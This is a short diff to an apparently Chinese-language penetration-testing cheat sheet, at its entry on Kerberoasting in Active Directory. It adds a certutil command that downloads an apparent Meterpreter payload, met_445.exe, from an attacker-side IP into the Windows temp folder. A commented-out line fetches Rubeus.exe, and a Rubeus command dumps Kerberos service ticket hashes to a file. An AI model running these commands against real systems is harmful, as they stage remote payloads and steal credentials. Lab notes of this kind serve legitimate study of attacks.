@@ -652,7 +652,8 @@ $decryptedPassword
 28. AD 可以尝试 kerberoasting
 ```bash
 # 在Ghostpack-CompiledBinaries文件夹下的Rubeus.exe
-certutil.exe -urlcache -f http://192.168.45.215/Rubeus.exe Rubeus.exe
+# certutil.exe -urlcache -f http://192.168.45.215/Rubeus.exe Rubeus.exe
+certutil.exe -f -urlcache -split http://192.168.45.196/met_445.exe c:/windows/temp/met_445.exe
 # 上传rubeus.exe文件，可以使用curl
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 # 执行文件
